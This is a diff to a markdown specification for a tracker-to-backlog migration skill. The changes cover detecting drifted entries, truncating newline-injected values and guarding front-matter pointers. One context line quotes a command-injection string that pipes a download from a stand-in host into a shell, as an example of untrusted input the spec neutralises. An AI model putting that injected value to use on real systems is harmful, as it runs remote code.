@@ -266,25 +266,37 @@ set is exactly:
 - an entry that parses short because a line-initial `##`/`###` appeared inside its body (**L5**'s
   companion rule);
 - a `### ` heading sitting outside both `## Open` and `## Closed` — the `FILE_HEADING_COUNT`
-  cross-check above, flagged `out-of-section`.
+  cross-check above, flagged `out-of-section`;
+- any span of content the heading scan claimed no entry for — the orphan sweep below, flagged
+  `heading-drift`.
 
-**Empty tracker** — `ENTRY_COUNT` is 0, `FILE_HEADING_COUNT` is 0, every bucket is empty. This is
-**not** an error and **not** a `BUCKET_E` case. It flows to Step 9, which deletes the tracker: an
-empty aggregate carries no information the store needs.
+**The orphan sweep — run it on every tracker, not just an apparently empty one.** The heading scan
+finds what looks like an entry. This sweep asks the complementary question: **is there content here
+the scan claimed nothing for?** Walk the file and mark every line accounted for by a recognized entry
+(its `### ` heading through its parsed extent), by the prose preamble, or by an `## Open` / `## Closed`
+header. Any remaining span carrying **substantive content** — a `**What's wrong:**`-style bold label, a
+`####` heading, an italic meta line — is an entry the parser could not see. Put each such span in
+**`BUCKET_E`** verbatim, flagged `heading-drift`.
 
-**Before concluding "empty", prove it.** Zero `### ` headings means the parser found no entries; it
-does not by itself mean the file holds nothing. A hand-edited tracker whose entries drifted to `####`
-headings, or to bolded titles with no heading at all, also yields `FILE_HEADING_COUNT == 0` — and
-deleting it would destroy every one of them at `0 == 0` with a report saying the file was empty. So
-when `FILE_HEADING_COUNT == 0`, check whether the file carries **substantive content** beyond its
-prose preamble and its `## Open` / `## Closed` headers — any `**What's wrong:**`-style bold label, any
-`####` heading, any italic meta line. If it does, this is **drift, not emptiness**: put the file's
-whole body in `BUCKET_E` as one `out-of-section` entry, so the tracker survives and the user sees what
-the parser could not read. Only a file with genuinely nothing left in it takes the delete path.
+Do **not** condition this on `FILE_HEADING_COUNT == 0`. The drift it catches — entries hand-edited
+down to `####` or to bolded titles with no heading at all — has nothing to do with how many *other*
+entries parsed cleanly. A tracker with two well-formed `### ` entries and three drifted ones satisfies
+`ENTRY_COUNT == FILE_HEADING_COUNT == 2`, migrates the two, reconciles `2 == 2`, and deletes the file
+with the other three still in it. That is the reconciliation reporting success against a denominator
+that never counted what was lost, which is the one failure this whole step is built to make
+impossible. A guard that runs only when the file looks empty catches the easy case and misses the
+likely one.
 
-**The whole step's disposition, in one line:** every line-initial `### ` heading **in the file** —
-not merely those under the two known sections — produces exactly one record, either a parsed `ENTRY`
-or a `BUCKET_E` entry. Nothing is ever dropped between heading and record.
+**Empty tracker** — `ENTRY_COUNT` is 0, `FILE_HEADING_COUNT` is 0, the orphan sweep found nothing, and
+every bucket is empty. This is **not** an error and **not** a `BUCKET_E` case. It flows to Step 9,
+which deletes the tracker: an empty aggregate carries no information the store needs. All three
+conditions are required — "no `### ` headings" alone is a statement about the parser, not about the
+file.
+
+**The whole step's disposition, in one line:** every line-initial `### ` heading **in the file** — not
+merely those under the two known sections — produces exactly one record, either a parsed `ENTRY` or a
+`BUCKET_E` entry; and every span of substantive content **without** such a heading produces a
+`BUCKET_E` entry of its own. Between them, nothing in the file goes unaccounted for.
 
 ## Step 4: Map Entries to Store Items
 
@@ -339,11 +351,19 @@ meta `by cycle <name>`; `first_recorded` ← meta `First recorded`; `files` as a
 >   untrusted like everything else here, and `a"; curl evil.sh | sh; echo "` is a legal thing for a
 >   hand-edited tracker to contain — which the never-interpolate rule fully neutralizes.
 >
->   No allowlist and no `..` rejection applies. P2 restricts characters in the **slug** and **type**
->   because those two "compose an on-disk path"; a `files[]` value composes none. This skill only ever
->   *reads* these paths — an existence test under `$PRIMARY`, never a write target, never a read of
->   their contents — so a `..` segment traverses nowhere and rejecting one would only discard a real
->   path that happens to be written relatively.
+>   No **character allowlist** and no `..` rejection applies. P2 restricts characters in the **slug**
+>   and **type** because those two "compose an on-disk path"; a `files[]` value composes none. This
+>   skill only ever *reads* these paths — an existence test under `$PRIMARY`, never a write target,
+>   never a read of their contents — so a `..` segment traverses nowhere and rejecting one would only
+>   discard a real path that happens to be written relatively.
+>
+>   **The newline rule below still applies, to each element.** "Never rewritten" is about a path's
+>   *shape*, not about where the value ends. **L5** makes this the common case, not an edge one: a
+>   `**Files:**` value runs to the next line-initial label, so anything a hand-edit left on the
+>   following lines is inside it. Split the value on its separators, take what precedes the first
+>   newline, and discard the rest — otherwise `plugins/dev/skills/foo/SKILL.md, bar` trailed by a line
+>   reading `routing: pending` emits a list that closes early and injects sibling front-matter keys,
+>   which is exactly the harm the next bullet describes.
 > - **Any lifted scalar** — a value containing a newline is truncated at the first one before it is
 >   written. An embedded newline in a front-matter scalar injects sibling keys (`scope:`,
 >   `routing: pending`, `promoted:`) into the item, which `dev:debt` and `dev:done` then act on as if
@@ -511,8 +531,8 @@ row, and the in-table divider says so before anyone tries. But their **slugs** a
 everyone else's, because Rule C's whole rationale is that P2 fixes a slug as an item's *permanent*
 identity and this table is the one cheap moment to correct it. In the reference fixture 7 of 11
 entries are closed; excluding them would leave the majority of the migration's permanent identifiers
-unseen by a human. Spec
-Criterion 2's slug rule says "per entry", and this is where "per entry" is honoured.
+unseen by a human. Spec Criterion 2's slug rule says "per entry", and this is where "per entry" is
+honoured.
 
 Every slug is reviewed at this single point, and every *routable* scope with it — the one review the
 migration gets before anything is written or leaves the repo (Success Criteria 2 and 4).
@@ -538,13 +558,14 @@ table as vacuously confirmed: this is the gate, and a gate that silently opens w
 to show is a gate that can silently open when there is. Two sub-cases reach it, and they get
 **different** messages, because Step 9 does different things with them:
 
-- **The tracker held no entries at all** — `FILE_HEADING_COUNT == 0` **and** Step 3's
-  substantive-content check found nothing → "Nothing to migrate. The tracker is empty and **will be
-  deleted** — an empty aggregate carries no information the store needs." That is what Step 9 does
-  with `0 == 0`, so say it here.
-- **Every entry landed in `BUCKET_E`** — including the drift case, where Step 3 put the whole file in
-  as one `out-of-section` entry → "Nothing can be migrated, and the tracker will **not** be deleted."
-  The count is already in the `BUCKET_E` header line above; don't print it twice.
+- **The tracker held no entries at all** — `FILE_HEADING_COUNT == 0` **and** Step 3's orphan sweep
+  found nothing → "Nothing to migrate. The tracker is empty and **will be deleted** — an empty
+  aggregate carries no information the store needs." That is what Step 9 does with `0 == 0`, so say it
+  here.
+- **Every entry landed in `BUCKET_E`** — including the drift case, where the orphan sweep caught spans
+  the heading scan never saw → "Nothing can be migrated." The `BUCKET_E` header line above already
+  carries the count *and* the "tracker will not be deleted" verdict; this line adds only what the
+  table's emptiness means.
 
 Do not collapse these into one line. Telling a user their tracker survives and then deleting it is the
 one report this skill must never produce.
@@ -718,8 +739,14 @@ Either outcome → **`BUCKET_C`**, carrying its issue number for the report.
 >    `dev:debt` (Success Criterion 11), so note it here for whoever next touches `inbox`.
 
 **P9.degrade — on any failure** (no network, no auth, API error, or `target_slug: null` from Step 5):
-write the item into the **current** repo's `docs/backlog/` with `scope: plugin` **and**
-`routing: pending`, then count it in **`BUCKET_D`**. It is surfaced and re-attempted, never dropped.
+the item is destined for the **current** repo's `docs/backlog/` with `scope: plugin` **and**
+`routing: pending`, and counts in **`BUCKET_D`**. It is surfaced and re-attempted, never dropped.
+
+**Destined, not yet written.** Do not write it here. Degrade decides an item's *disposition*; the
+name it gets and the moment it lands are settled by the two procedures below, after every delivery in
+the route set has been attempted. Writing at failure time would skip the three-set collision check and
+let two degrading items share a final path — the failure the in-run set exists to prevent, reachable
+by following this paragraph literally.
 
 **P2 collision disambiguation on the degrade write — mirror of Step 7 step 2.** Restated in full
 here rather than referred back to, because this path is reached only on failure and must not depend
@@ -761,8 +788,14 @@ whose `related_title` it could not resolve, knowing some of those targets would 
 `SLUG_MAP` is complete, re-check every item Step 7 flagged: if its `related_title` now resolves to a
 degrade name, write `possibly_related_to: <final slug>` into the file that carries that item and clear
 the flag. For a `BUCKET_A` item that file is the one Step 7 wrote; for a `BUCKET_B` item it is the
-pre-existing store file Step 7 merged into — edit it in place the same way, appending the field
-without disturbing anything else, per P6's never-replace rule.
+pre-existing store file Step 7 merged into.
+
+**Never overwrite a pointer that is already there.** `possibly_related_to:` is a single optional
+scalar (P1), not a list, so a `BUCKET_B` target that already carries one has no room for a second: add
+the key only when the field is absent, and when it is present leave it untouched and flag the item
+`related-not-backfilled` for the report. The store's existing pointer was written by whichever cycle
+owned that item and is not this migration's to reassign. (P6's never-replace rule is about **body
+text** and does not reach front matter, which is why this needs saying on its own.)
 
 This backfill is the one place the skill revisits a file after Step 7 finished with it. The reason is
 the ordering constraint that produced Rule D in the first place: a pointer must target a settled name,
@@ -805,12 +838,19 @@ right and a store that is wrong. This is the one place in `/dev` where believing
 unrecoverable, so check it:
 
 - every `BUCKET_A` item → its step-2 final path exists on disk;
-- every `BUCKET_B` item → its matched file carries **every** cycle name the incoming item had, and
-  `recurrence: == len(cycles)`. Check *containment*, not that the number went up: Step 7's merge
-  appends only cycle names the matched file lacks, so a legacy entry whose cycles the store already
-  records correctly appends nothing and leaves `recurrence:` where it was. That is a **successful**
-  merge, and a check for "incremented" would fail it, drop the item from bucket (b), short the sum,
-  and preserve the tracker forever across identical re-runs;
+- every `BUCKET_B` item → its matched file carries **every** cycle name the incoming item had —
+  **compared case-insensitively, exactly as Step 7's merge compares them** — and
+  `recurrence: == len(cycles)`. Both halves of that sentence are load-bearing:
+  - **Containment, not increment.** Step 7's merge appends only cycle names the matched file lacks, so
+    a legacy entry whose cycles the store already records correctly appends nothing and leaves
+    `recurrence:` where it was. That is a **successful** merge; a check for "incremented" fails it.
+  - **Case-insensitive.** Step 4 lowercased the incoming names and Step 7 keeps the store's spelling
+    on a match, so the store may legitimately hold `ENG-123-auth` where the incoming name is
+    `eng-123-auth`. A literal comparison never finds it.
+
+  Get either half wrong and the outcome is the same: a correct merge is dropped from bucket (b), the
+  sum shorts, and the tracker is preserved — identically on every re-run, so the repo can never
+  finish migrating;
 - every `BUCKET_C` item → a non-empty issue number came back;
 - every `BUCKET_D` item → its degrade file exists on disk **at the name this run assigned it**, not
   merely somewhere.
@@ -844,9 +884,10 @@ do not delete it.
 **The closing report** covers: items written by scope, items merged, items routed **with their issue
 numbers**, anything held as `routing: pending`, every flag raised along the way (`missing-files`,
 `missing-why-deferred`, `missing-done-looks-like`, `date-unparseable`, `recurrence-corrected`,
-`related-unresolved`, `slug-fallback`, `slug-deduped-in-run`, `out-of-section`, and any slug
-disambiguations), and anything unparseable. Close with **NEVER-COMMIT** stated in the user's terms —
-naming **everything** the run left uncommitted, not just the store:
+`related-unresolved`, `related-not-backfilled`, `slug-fallback`, `slug-deduped-in-run`,
+`out-of-section`, `heading-drift`, and any slug disambiguations), and anything unparseable. Close
+with **NEVER-COMMIT** stated in the user's terms — naming **everything** the run left uncommitted,
+not just the store:
 
 ```
 Uncommitted in this repo after migration:
